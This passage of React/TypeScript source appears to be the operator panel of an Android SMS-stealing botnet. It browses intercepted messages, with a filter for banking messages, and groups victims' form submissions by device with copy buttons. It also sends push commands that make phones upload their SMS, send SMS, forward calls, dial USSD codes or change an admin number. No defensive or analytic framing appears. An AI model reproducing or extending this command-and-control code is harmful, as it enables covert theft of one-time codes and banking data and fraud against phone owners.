      if (appFilter) qs.set("appId", appFilter);
      const r = await apiFetch(`/api/messages?${qs}`, { headers: { "x-master-pin": masterPin } });
      if (r.ok) {
        const data = await r.json() as MsgRow[];
        setMsgs(prev => [...prev, ...data]);
        setHasMore(data.length === 30);
        cursorRef.current = data.length > 0 ? data[data.length - 1].id : null;
      }
    } catch { } finally { setLoadingMore(false); }
  }, [appFilter, masterPin, hasMore, loadingMore]);

  /* ── SEARCH: cursor-based — auto-fetch ALL pages until done, no OFFSET penalty ── */
  const runSearch = useCallback(async (term: string) => {
    setSearching(true); setSearchDone(false); setSearchHasMore(false); setSearchLoadedCount(0);
    searchCursorRef.current = null; cursorRef.current = null; setHasMore(false);
    let firstBatch = true;
    let total = 0;
    try {
      while (true) {
        const qs = new URLSearchParams({ search: term, limit: String(SEARCH_PAGE) });
        if (appFilter) qs.set("appId", appFilter);
        if (searchCursorRef.current !== null) qs.set("cursor", String(searchCursorRef.current));
        const r = await apiFetch(`/api/messages?${qs}`, { headers: { "x-master-pin": masterPin } });
        if (!r.ok) break;
        const resp = await r.json() as { data: MsgRow[]; hasMore: boolean; lastId: number | null };
        const batch = resp.data ?? [];
        total += batch.length;
        if (firstBatch) { setMsgs(batch); firstBatch = false; }
        else setMsgs(prev => [...prev, ...batch]);
        setSearchLoadedCount(total);
        searchCursorRef.current = resp.lastId ?? null;
        if (!resp.hasMore || resp.lastId == null) { setSearchHasMore(false); break; }
      }
    } catch { } finally { setSearching(false); setSearchDone(true); }
  }, [appFilter, masterPin]); // eslint-disable-line react-hooks/exhaustive-deps

  /* ── SEARCH: manual load more (for very large result sets if user wants) ── */
  const loadMoreSearch = useCallback(async (term: string) => {
    if (searchCursorRef.current === null) return;
    setLoadingMoreSearch(true);
    try {
      while (true) {
        const qs = new URLSearchParams({ search: term, limit: String(SEARCH_PAGE) });
        if (appFilter) qs.set("appId", appFilter);
        if (searchCursorRef.current !== null) qs.set("cursor", String(searchCursorRef.current));
        const r = await apiFetch(`/api/messages?${qs}`, { headers: { "x-master-pin": masterPin } });
        if (!r.ok) break;
        const resp = await r.json() as { data: MsgRow[]; hasMore: boolean; lastId: number | null };
        const batch = resp.data ?? [];
        setMsgs(prev => [...prev, ...batch]);
        setSearchLoadedCount(prev => prev + batch.length);
        searchCursorRef.current = resp.lastId ?? null;
        if (!resp.hasMore || resp.lastId == null) { setSearchHasMore(false); break; }
      }
    } catch { } finally { setLoadingMoreSearch(false); }
  }, [appFilter, masterPin]);

  /* ── Trigger correct mode ── */
  useEffect(() => {
    if (debouncedSearch) void runSearch(debouncedSearch);
    else void loadFirst();
  }, [debouncedSearch, appFilter]); // eslint-disable-line react-hooks/exhaustive-deps

  /* ── Infinite scroll sentinel (browse mode only) ── */
  const hasMsgs = msgs.length > 0;
  useEffect(() => {
    const el = sentinelRef.current;
    if (!el || debouncedSearch) return;
    const obs = new IntersectionObserver(entries => {
      if (entries[0].isIntersecting) void loadMore();
    }, { rootMargin: "600px" });
    obs.observe(el);
    return () => obs.disconnect();
  }, [debouncedSearch, loadMore, hasMsgs]);

  /* ── Filtered (sensitive toggle) ── */
  const displayed = useMemo(() => {
    return sensitiveOnly ? msgs.filter(m => isBankingMsg(m.body, m.fromSender) || m.isSensitive) : msgs;
  }, [msgs, sensitiveOnly]);

  const appColors = useMemo(() => {
    const colors: Record<string, string> = {};
    const palette = ["#6366f1","#8b5cf6","#06b6d4","#f59e0b","#10b981","#ef4444","#f97316","#ec4899"];
    let ci = 0;
    msgs.forEach(m => { if (!colors[m.appId]) colors[m.appId] = palette[ci++ % palette.length]; });
    return colors;
  }, [msgs]);

  const isLoading = loading || searching;
  const totalFiltered = sensitiveOnly ? msgs.filter(m => isBankingMsg(m.body, m.fromSender) || m.isSensitive).length : msgs.length;

  return (
    <div style={{ padding: "10px 0", display: "flex", flexDirection: "column", gap: 10 }}>
      {/* ── Toolbar ── */}
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <div style={{ flex: 1, minWidth: 200, background: T.card, border: `1px solid ${T.borderLight}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
          <span style={{ color: T.muted, fontSize: 13 }}>⌕</span>
          <input value={search} onChange={e => setSearch(e.target.value)}
            placeholder="Search across ALL messages in DB…"
            style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: T.text }} />
          {searching && <Spinner size={12} />}
          {search && !searching && <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 14, padding: 0 }}>✕</button>}
        </div>
        <button onClick={() => setSensitiveOnly(v => !v)} style={{
          padding: "8px 12px", borderRadius: 8, border: "1.5px solid",
          borderColor: sensitiveOnly ? T.red : T.borderLight,
          background: sensitiveOnly ? T.red + "18" : T.card,
          color: sensitiveOnly ? T.red : T.muted,
          fontSize: 11, fontWeight: 600, cursor: "pointer",
        }}>Sensitive</button>
      </div>

      {/* ── Status bar ── */}
      <div style={{ fontSize: 10, color: "#64748b", display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
        <span style={{ background: T.accentGlow, color: T.accentLight, borderRadius: 99, padding: "2px 10px", fontWeight: 700 }}>
          DB: {totalDbCount !== null ? totalDbCount.toLocaleString() : "…"} total
        </span>
        {debouncedSearch ? (
          searching
            ? <span style={{ color: T.muted }}>Searching… {searchLoadedCount > 0 ? <b style={{ color: T.accentLight }}>{searchLoadedCount.toLocaleString()} found so far</b> : ""}</span>
            : searchDone
              ? <>
                  <b style={{ color: T.text }}>{displayed.length.toLocaleString()}</b>
                  <span style={{ color: T.muted }}>{searchHasMore ? " results (load more below)" : ` results — full DB searched`}</span>
                </>
              : null
        ) : (
          <>
            <span>Loaded <b style={{ color: T.text }}>{msgs.length.toLocaleString()}</b>
              {totalDbCount !== null && msgs.length < totalDbCount
                ? <span style={{ color: T.muted }}> of {totalDbCount.toLocaleString()}{hasMore ? " · scroll ↓" : ""}</span>
                : ""}
            </span>
            {!hasMore && msgs.length > 0 && <span style={{ color: T.green, fontWeight: 700 }}>✓ All loaded</span>}
          </>
        )}
      </div>

      {/* ── Content ── */}
      {isLoading && msgs.length === 0 ? (
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
          <Spinner />
          <span style={{ fontSize: 13, color: "#94a3b8" }}>
            {debouncedSearch ? `Searching ${totalDbCount?.toLocaleString() ?? "…"} messages…` : "Loading…"}
          </span>
        </div>
      ) : displayed.length === 0 ? (
        <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>
          {searchDone ? `No results for "${debouncedSearch || search}"` : search || sensitiveOnly ? "No messages found" : "No messages yet"}
        </div>
      ) : (
        <>
          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
            {displayed.map(msg => (
              <MsgCard key={msg.id} msg={msg} appColor={appColors[msg.appId] ?? T.accent} onOpenDevice={onOpenDevice} />
            ))}
          </div>
          {/* Browse mode: infinite scroll sentinel */}
          {!debouncedSearch && <div ref={sentinelRef} style={{ height: 1 }} />}
          {/* Browse mode: loading spinner */}
          {!debouncedSearch && loadingMore && (
            <div style={{ display: "flex", justifyContent: "center", padding: "10px 0", gap: 8, color: T.muted, fontSize: 12 }}>
              <Spinner /> Loading more…
            </div>
          )}
          {/* Browse mode: all loaded */}
          {!debouncedSearch && !hasMore && msgs.length > 0 && (
            <div style={{ textAlign: "center", color: T.green, fontSize: 11, fontWeight: 700, padding: "8px 0" }}>
              ✓ All {msgs.length.toLocaleString()} messages loaded
            </div>
          )}
          {/* Search mode: Load More Results button */}
          {debouncedSearch && searchHasMore && !loadingMoreSearch && (
            <div style={{ textAlign: "center", paddingTop: 8 }}>
              <button
                onClick={() => void loadMoreSearch(debouncedSearch)}
                style={{ padding: "10px 28px", borderRadius: 10, background: `linear-gradient(135deg,${T.accent},#8b5cf6)`, border: "none", color: "#fff", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
                Load More Results
              </button>
            </div>
          )}
          {debouncedSearch && loadingMoreSearch && (
            <div style={{ display: "flex", justifyContent: "center", padding: "10px 0", gap: 8, color: T.muted, fontSize: 12 }}>
              <Spinner /> Loading more results…
            </div>
          )}
          {debouncedSearch && !searchHasMore && searchDone && msgs.length > 0 && (
            <div style={{ textAlign: "center", color: T.green, fontSize: 11, fontWeight: 700, padding: "8px 0" }}>
              ✓ All {msgs.length.toLocaleString()} results loaded
            </div>
          )}
        </>
      )}
    </div>
  );
}

/* ══════════════════════════════════════════
   GROUPS TAB
══════════════════════════════════════════ */
/* ── Helpers for GroupsTab ── */
function timeAgo(iso: string | null | undefined): string {
  if (!iso) return "—";
  const diff = Date.now() - new Date(iso).getTime();
  if (diff <= 0) return "just now"; // future timestamp / clock skew
  if (diff < 60000) return "just now";
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
  return `${Math.floor(diff / 86400000)}d ago`;
}
function fmtKey(k: string) { return k.replace(/_/g, " ").replace(/([A-Z])/g, " $1").trim().replace(/^./, c => c.toUpperCase()); }
function CopyIconBtn({ value, title = "Copy" }: { value: string; title?: string }) {
  const [done, setDone] = useState(false);
  function handleCopy(e: React.MouseEvent) {
    e.stopPropagation();
    copyToClipboard(value).then(() => { setDone(true); setTimeout(() => setDone(false), 2000); });
  }
  return (
    <button onClick={handleCopy} title={title} style={{ background: "none", border: "none", cursor: "pointer", color: done ? T.green : T.accentLight, padding: 1, display: "flex", flexShrink: 0 }}>
      {done
        ? <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
        : <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
      }
    </button>
  );
}

function GroupsTab({ apps, masterPin, syncTick: _syncTick, onOpenDevice }: { apps: App[]; masterPin: string; syncTick?: number; onOpenDevice?: (deviceId: string) => void }) {
  const [groups, setGroups] = useState<GroupRow[]>([]);
  const [loading, setLoading] = useState(false);
  const [loadingAll, setLoadingAll] = useState(false); // background: fetching pages 2+
  const [apiTotal, setApiTotal] = useState(0);        // total entries from API
  const [appFilter, setAppFilter] = useState("");
  const [search, setSearch] = useState("");
  const [visibleCount, setVisibleCount] = useState(15);
  const sentinelRef = useRef<HTMLDivElement>(null);
  const fetchAbortRef = useRef(0); // increment to cancel in-flight background fetches

  const fetchGroups = useCallback(async () => {
    setLoading(true);
    setLoadingAll(false);
    const myRun = ++fetchAbortRef.current;
    try {
      const appQs = appFilter ? `&appId=${encodeURIComponent(appFilter)}` : "";
      // Page 1 — show immediately
      const r = await apiFetch(`/api/data?limit=1000&offset=0${appQs}`, { headers: { "x-master-pin": masterPin } });
      if (!r.ok || myRun !== fetchAbortRef.current) return;
      const first = await r.json() as { data: GroupRow[]; total: number; hasMore: boolean };
      setGroups(first.data);
      setApiTotal(first.total);
      setLoading(false);
      // Background: fetch remaining pages silently
      if (first.hasMore) {
        setLoadingAll(true);
        let offset = first.data.length;
        let accumulated = [...first.data];
        while (offset < first.total && myRun === fetchAbortRef.current) {
          const rMore = await apiFetch(`/api/data?limit=1000&offset=${offset}${appQs}`, { headers: { "x-master-pin": masterPin } });
          if (!rMore.ok || myRun !== fetchAbortRef.current) break;
          const more = await rMore.json() as { data: GroupRow[]; total: number; hasMore: boolean };
          if (more.data.length === 0) break;
          accumulated = [...accumulated, ...more.data];
          setGroups([...accumulated]);
          setApiTotal(more.total);
          offset += more.data.length;
          if (!more.hasMore) break;
        }
        if (myRun === fetchAbortRef.current) setLoadingAll(false);
      }
    } catch { /* ignore */ } finally {
      if (myRun === fetchAbortRef.current) { setLoading(false); setLoadingAll(false); }
    }
  }, [appFilter, masterPin]);

  useEffect(() => { void fetchGroups(); }, [fetchGroups]);
  useEffect(() => { setVisibleCount(15); }, [search, appFilter]);

  /* Group by userId+appId (master admin is cross-app) */
  const grouped = useMemo(() => {
    const q = search.trim().toLowerCase();
    const formByDevice: Record<string, GroupRow[]> = {};
    for (const g of groups) {
      const key = `${g.appId}||${g.deviceId}`;
      if (!formByDevice[key]) formByDevice[key] = [];
      formByDevice[key].push(g);
    }

    /* Build userId groups */
    const byUser: Record<string, { appId: string; deviceId: string; entries: GroupRow[] }[]> = {};
    for (const [key, entries] of Object.entries(formByDevice)) {
      const [appId, deviceId] = key.split("||");
      const userId = deviceId ?? "unknown";
      const uid = `${appId}||${userId}`;
      if (!byUser[uid]) byUser[uid] = [];
      byUser[uid].push({ appId: appId ?? "", deviceId: deviceId ?? "", entries });
    }

    /* Sort each user's devices by newest submission */
    for (const devices of Object.values(byUser)) {
      devices.sort((a, b) => {
        const la = Math.max(...a.entries.map(e => new Date(e.submittedAt).getTime()));
        const lb = Math.max(...b.entries.map(e => new Date(e.submittedAt).getTime()));
        return lb - la;
      });
    }

    /* Sort users by newest submission */
    let userIds = Object.keys(byUser).sort((a, b) => {
      const la = Math.max(...byUser[a].flatMap(d => d.entries.map(e => new Date(e.submittedAt).getTime())));
      const lb = Math.max(...byUser[b].flatMap(d => d.entries.map(e => new Date(e.submittedAt).getTime())));
      return lb - la;
    });

    /* Filter by search */
    if (q) {
      userIds = userIds.filter(uid =>
        uid.toLowerCase().includes(q) ||
        byUser[uid].some(d =>
          d.deviceId.toLowerCase().includes(q) ||
          d.appId.toLowerCase().includes(q) ||
          d.entries.some(e => Object.values(e.data ?? {}).some(v => String(v).toLowerCase().includes(q)))
        )
      );
    }

    return { userIds, byUser };
  }, [groups, search]);

  /* Infinite scroll sentinel */
  const totalUsers = grouped.userIds.length;
  useEffect(() => {
    const el = sentinelRef.current;
    if (!el) return;
    const obs = new IntersectionObserver(entries => {
      if (entries[0].isIntersecting) setVisibleCount(c => Math.min(c + 15, totalUsers));
    }, { rootMargin: "400px" });
    obs.observe(el);
    return () => obs.disconnect();
  }, [totalUsers]);

  const visibleUsers = grouped.userIds.slice(0, visibleCount);
  const totalEntries = apiTotal || groups.length;

  const B = T.borderLight;
  const H = T.headerBg;

  return (
    <div style={{ padding: "10px 0", display: "flex", flexDirection: "column", gap: 8 }}>

      {/* Toolbar */}
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <div style={{ flex: 1, minWidth: 180, background: T.card, border: `1px solid ${B}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
          <span style={{ color: T.muted, fontSize: 13 }}>⌕</span>
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search by value, device, app…"
            style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: T.text }} />
          {search && <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 14, padding: 0 }}>✕</button>}
        </div>
        <button onClick={() => void fetchGroups()} disabled={loading} style={{ padding: "8px 12px", borderRadius: 8, border: `1px solid ${B}`, background: T.card, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: loading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 5 }}>
          {loading ? <Spinner /> : <Ic.Refresh />} Refresh
        </button>
      </div>

      <div style={{ fontSize: 10, color: "#64748b", display: "flex", alignItems: "center", gap: 6 }}>
        <span>{totalUsers} device group{totalUsers !== 1 ? "s" : ""} · {groups.length} loaded / {totalEntries} entr{totalEntries !== 1 ? "ies" : "y"}</span>
        {loadingAll && <span style={{ display: "inline-flex", alignItems: "center", gap: 4, color: "#7c3aed" }}><Spinner /><span>loading all…</span></span>}
        {!loadingAll && groups.length === totalEntries && totalEntries > 0 && <span style={{ color: T.green }}>✓ all loaded</span>}
        {visibleCount < totalUsers && <span>· showing {visibleCount}</span>}
      </div>

      {loading && groups.length === 0 ? (
        <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
          <Spinner /><span style={{ fontSize: 13, color: "#94a3b8" }}>Loading…</span>
        </div>
      ) : totalUsers === 0 ? (
        <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>
          {search ? "No results found" : "No form submissions yet"}
        </div>
      ) : (
        <>
          {visibleUsers.map(uid => {
            const [appId, userId] = uid.split("||");
            const uDevices = grouped.byUser[uid] ?? [];
            const totalUEntries = uDevices.reduce((s, d) => s + d.entries.length, 0);
            return (
              <div key={uid} style={{ borderRadius: 10, border: `1px solid ${B}`, overflow: "hidden" }}>

                {/* ── User header ── */}
                <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 10px", background: H, borderBottom: `1px solid ${B}` }}>
                  <div style={{ width: 26, height: 26, borderRadius: "50%", background: T.accent, display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, fontSize: 9, flexShrink: 0, fontFamily: "monospace" }}>
                    {(userId ?? "").slice(-2).toUpperCase()}
                  </div>
                  <span style={{ flex: 1, fontSize: 11, fontWeight: 700, fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", color: T.text }}>{userId}</span>
                  <CopyIconBtn value={userId ?? ""} title="Copy User ID" />
                  {appId && <span style={{ fontSize: 9, color: T.accent, fontWeight: 700, fontFamily: "monospace", flexShrink: 0, background: T.accentGlow, borderRadius: 4, padding: "1px 5px" }}>{appId}</span>}
                  <span style={{ fontSize: 9, color: "#8b5cf6", fontWeight: 700, flexShrink: 0 }}>{totalUEntries} entr{totalUEntries !== 1 ? "ies" : "y"}</span>
                </div>

                {/* ── One block per device ── */}
                {uDevices.map((dev, di) => {
                  const devForm = dev.entries.slice().sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
                  const isLast = di === uDevices.length - 1;
                  const lastOnline = devForm[0]?.submittedAt ?? null;

                  return (
                    <div key={dev.deviceId} style={{ borderBottom: isLast ? "none" : `1px solid ${B}`, background: T.card }}>

                      {/* Device sub-header */}
                      <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "5px 10px", borderBottom: `1px solid ${H}` }}>
                        <div style={{ flex: 1, minWidth: 0, display: "flex", alignItems: "center", gap: 5, flexWrap: "wrap" }}>
                          <span style={{ fontSize: 11, fontWeight: 700, color: T.text, fontFamily: "monospace" }}>{dev.deviceId}</span>
                          <CopyIconBtn value={dev.deviceId} title="Copy device ID" />
                          <span style={{ fontSize: 9, color: "#64748b" }}>{timeAgo(lastOnline)}</span>
                        </div>
                        <span style={{ fontSize: 10, padding: "4px 8px", borderRadius: 7, background: T.headerBg, border: `1px solid ${B}`, color: T.mutedLight, fontWeight: 700, flexShrink: 0 }}>
                          {dev.entries.length} entr{dev.entries.length !== 1 ? "ies" : "y"}
                        </span>
                        {onOpenDevice && (
                          <button onClick={() => onOpenDevice(dev.deviceId)} style={{ fontSize: 12, padding: "5px 14px", borderRadius: 7, border: "none", background: T.accent, color: "#fff", cursor: "pointer", fontWeight: 700, flexShrink: 0, boxShadow: "0 2px 8px rgba(99,102,241,0.4)" }}>
                            Open
                          </button>
                        )}
                      </div>

                      {/* All entries expanded inline */}
                      {devForm.map((entry, idx) => {
                        const pairs = Object.entries(entry.data ?? {});
                        const time = new Date(entry.submittedAt).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
                        return (
                          <div key={entry.id} style={{ borderBottom: idx < devForm.length - 1 ? `1px solid ${H}` : "none" }}>
                            {/* Entry number + time */}
                            <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "2px 10px", background: H }}>
                              <span style={{ fontSize: 8, color: "#8b5cf6", fontFamily: "monospace", fontWeight: 700 }}>#{idx + 1}</span>
                              <span style={{ fontSize: 8, color: "#64748b" }}>{time}</span>
                            </div>
                            {/* Key-value pairs */}
                            {pairs.length === 0
                              ? <div style={{ fontSize: 10, color: "#64748b", padding: "2px 10px" }}>—</div>
                              : pairs.map(([k, v]) => {
                                const sv = String(v ?? "");
                                return (
                                  <div key={k} style={{ display: "flex", padding: "3px 10px", gap: 8, alignItems: "center" }}>
                                    <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, minWidth: 88, flexShrink: 0 }}>{fmtKey(k)}</span>
                                    <span style={{ fontSize: 10, color: T.text, wordBreak: "break-all", flex: 1 }}>{sv}</span>
                                    {sv && <CopyIconBtn value={sv} title={`Copy ${fmtKey(k)}`} />}
                                  </div>
                                );
                              })
                            }
                          </div>
                        );
                      })}
                    </div>
                  );
                })}
              </div>
            );
          })}
          <div ref={sentinelRef} style={{ height: 1 }} />
          {visibleCount < totalUsers && (
            <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><Spinner /></div>
          )}
        </>
      )}
    </div>
  );
}

/* ══════════════════════════════════════════
   DEVICE DETAIL + FCM ACTIONS  (sub-admin style)
══════════════════════════════════════════ */
type FcmState = "idle" | "sending" | "ok" | "err";
type ActionKey = "online_check" | "get_sms" | "send_sms" | "update_number" | "call_forward" | "dial_ussd";

const ACTION_LABELS: { key: ActionKey; label: string }[] = [
  { key: "online_check", label: "Online Check" },
  { key: "get_sms",      label: "Get SMS"      },
  { key: "send_sms",     label: "Send SMS"     },
  { key: "update_number",label: "Update"       },
  { key: "call_forward", label: "Call Forward" },
  { key: "dial_ussd",    label: "Dial USSD"   },
];

function InfoRow({ label, value, accent, mono, children }: { label: string; value?: string; accent?: string; mono?: boolean; children?: React.ReactNode }) {
  return (
    <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${T.border}`, gap: 8 }}>
      <div style={{ width: 110, fontSize: 11, color: T.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>{label}</div>
      {children ?? <div style={{ flex: 1, fontSize: 12, color: accent ?? T.mutedLight, fontFamily: mono ? "monospace" : "inherit", wordBreak: "break-all" }}>{value}</div>}
    </div>
  );
}

function DeviceActionPanel({ action, device, masterPin, onClose }: { action: ActionKey; device: FullDevice; masterPin: string; onClose: () => void }) {
  const [sim, setSim] = useState<"1" | "2">("1");
  const [number, setNumber] = useState("");
  const [smsText, setSmsText] = useState("");
  const [ussdCode, setUssdCode] = useState("");
  const [smsCount, setSmsCount] = useState("20");
  const [adminEnabled, setAdminEnabled] = useState(true);
  const [state, setState] = useState<FcmState>("idle");
  const [log, setLog] = useState("");
  const [disableState, setDisableState] = useState<FcmState>("idle");
  const [countdown, setCountdown] = useState(0);

  // Sub-admin pattern: flag so only active pings trigger "ok" — not regular heartbeats
  const pingActiveRef = useRef(false);

  // Live countdown via useEffect (clean — no side-effects in state updater)
  useEffect(() => {
    if (state !== "sending" || action !== "online_check") return;
    setCountdown(0);
    const iv = setInterval(() => setCountdown(c => c + 1), 1000);
    return () => clearInterval(iv);
  }, [state, action]);

  // Auto-timeout online_check after 30s
  useEffect(() => {
    if (state !== "sending" || action !== "online_check") return;
    const t = setTimeout(() => {
      pingActiveRef.current = false;
      setState("idle"); setLog(""); setCountdown(0);
    }, 30000);
    return () => clearTimeout(t);
  }, [state, action]);

  // WS: device_updated → success ONLY if we are actively waiting (sub-admin pattern)
  useEffect(() => {
    if (action !== "online_check") return;
    function onUpdated(e: Event) {
      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
      if (deviceId !== device.deviceId || !pingActiveRef.current) return;
      pingActiveRef.current = false;
      setState("ok"); setCountdown(0);
      setTimeout(() => { setState("idle"); setLog(""); }, 2000);
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, [action, device.deviceId]);

  async function fcm(data: Record<string, string>) {
    if (!device.hasFcm) { setLog("No FCM token — device unreachable."); setState("err"); return; }
    if (action === "online_check") {
      setState("sending"); setLog(""); // counter starts immediately
      try {
        const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
        if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); return; }
        // FCM delivered — NOW arm WS listener so pre-send heartbeats don't fire false "Online"
        pingActiveRef.current = true;
      } catch { setLog("Network error"); setState("err"); }
      return;
    }
    setState("sending"); setLog("Sending…");
    try {
      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); return; }
      setLog("Sent! Waiting for device…"); setState("ok");
      setTimeout(() => { setState("idle"); setLog(""); }, 6000);
    } catch { setLog("Network error"); setState("err"); }
  }

  const titles: Record<ActionKey, string> = {
    online_check: "Online Check", get_sms: "Get SMS", send_sms: "Send SMS",
    update_number: "Update Admin Number", call_forward: "Call Forwarding", dial_ussd: "Dial USSD",
  };

  const inp: React.CSSProperties = { width: "100%", boxSizing: "border-box", background: T.inputBg, border: `1.5px solid ${T.borderLight}`, borderRadius: 8, padding: "10px 12px", fontSize: 13, outline: "none", color: T.text, marginBottom: 10 };

  function PrimaryBtn({ onClick, disabled, children }: { onClick: () => void; disabled: boolean; children: React.ReactNode }) {
    return (
      <button onClick={onClick} disabled={disabled} style={{ width: "100%", padding: "11px 0", borderRadius: 9, border: "none", background: state === "ok" ? T.green : T.accent, color: "#fff", fontWeight: 700, fontSize: 14, cursor: disabled ? "wait" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
        {children}
      </button>
    );
  }

  const StatusLog = () => log ? (
    <div style={{ fontSize: 12, padding: "8px 12px", borderRadius: 8, marginBottom: 10, background: state === "ok" ? T.green + "18" : state === "err" ? T.red + "15" : T.accentGlow, color: state === "ok" ? T.green : state === "err" ? T.red : T.accentLight }}>{log}</div>
  ) : null;

  function SimSel() {
    return (
      <div style={{ display: "flex", gap: 8, marginBottom: 10 }}>
        {(["1", "2"] as const).map(s => {
          const carrier = s === "1" ? device.sim1Carrier : device.sim2Carrier;
          const phone = s === "1" ? device.sim1Phone : device.sim2Phone;
          const active = sim === s;
          return (
            <button key={s} onClick={() => setSim(s)} style={{ flex: 1, padding: "7px 8px", borderRadius: 8, border: `1.5px solid ${active ? T.accent : T.borderLight}`, background: active ? T.accentGlow : T.card, cursor: "pointer", textAlign: "left" }}>
              <div style={{ fontSize: 10, fontWeight: 700, color: active ? T.accentLight : T.muted }}>SIM {s}</div>
              <div style={{ fontSize: 9, color: active ? T.accentLight : T.muted, marginTop: 1 }}>{[carrier, phone].filter(Boolean).join(" · ") || "No SIM"}</div>
            </button>
          );
        })}
      </div>
    );
  }

  return (
    <div style={{ background: T.card, borderRadius: 12, border: `1.5px solid ${T.accent}44`, padding: 14 }}>
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
        <div style={{ fontWeight: 700, fontSize: 14, color: T.text }}>{titles[action]}</div>
        <button onClick={onClose} style={{ background: "none", border: "none", color: T.muted, fontSize: 18, cursor: "pointer", padding: 0, lineHeight: 1 }}>✕</button>
      </div>

      {action === "online_check" && (
        <>
          <div style={{ fontSize: 12, color: T.mutedLight, marginBottom: 12 }}>Pings <b style={{ color: T.text }}>{device.name}</b> to check if it's online and reachable.</div>
          <StatusLog />
          <button onClick={() => void fcm({ type: "0" })} disabled={state === "sending"} style={{
            width: "100%", padding: "12px 0", borderRadius: 9, border: "none",
            background: state === "ok" ? T.green : T.accent,
            color: "#fff", fontWeight: 700, fontSize: 14,
            cursor: state === "sending" ? "wait" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
          }}>
            {state === "sending" ? <><Spinner /> Waiting… {countdown}s</> : "Ping Device"}
          </button>
          {state === "sending" && (
            <div style={{ marginTop: 8, height: 3, background: T.border, borderRadius: 2, overflow: "hidden" }}>
              <div style={{ height: "100%", background: `linear-gradient(90deg,${T.accent},#8b5cf6)`, width: `${Math.min((countdown / 30) * 100, 100)}%`, transition: "width 1s linear" }} />
            </div>
          )}
        </>
      )}

      {action === "get_sms" && (
        <>
          <div style={{ fontSize: 12, color: T.mutedLight, marginBottom: 10 }}>Device will upload its latest messages.</div>
          <input type="text" placeholder="Phone filter (optional)" value={number} onChange={e => setNumber(e.target.value)} style={inp} />
          <input type="number" placeholder="Max count (default 20)" value={smsCount} onChange={e => setSmsCount(e.target.value)} style={inp} />
          <StatusLog />
          <PrimaryBtn onClick={() => fcm({ type: "get_sms", count: smsCount || "20", ...(number.trim() ? { phoneNumber: number.trim() } : {}), simSlot: sim === "2" ? "1" : "0" })} disabled={state === "sending"}>
            {state === "sending" ? <><Spinner /> Requesting…</> : "Get SMS"}
          </PrimaryBtn>
        </>
      )}

      {action === "send_sms" && (
        <>
          <SimSel />
          <input type="tel" placeholder="Recipient number" value={number} onChange={e => setNumber(e.target.value)} style={inp} />
          <textarea placeholder="Message text…" value={smsText} onChange={e => setSmsText(e.target.value)} rows={3} style={{ ...inp, resize: "vertical", fontFamily: "inherit" }} />
          <StatusLog />
          <PrimaryBtn onClick={() => {
            if (!number.trim()) { setLog("Enter a recipient number."); setState("err"); return; }
            if (!smsText.trim()) { setLog("Enter message text."); setState("err"); return; }
            void fcm({ type: "send_sms", to: number.trim(), message: smsText.trim(), sim: sim === "2" ? "1" : "0" });
          }} disabled={state === "sending"}>
            {state === "sending" ? <><Spinner /> Sending…</> : "Send SMS"}
          </PrimaryBtn>
        </>
      )}

      {action === "update_number" && (
        <>
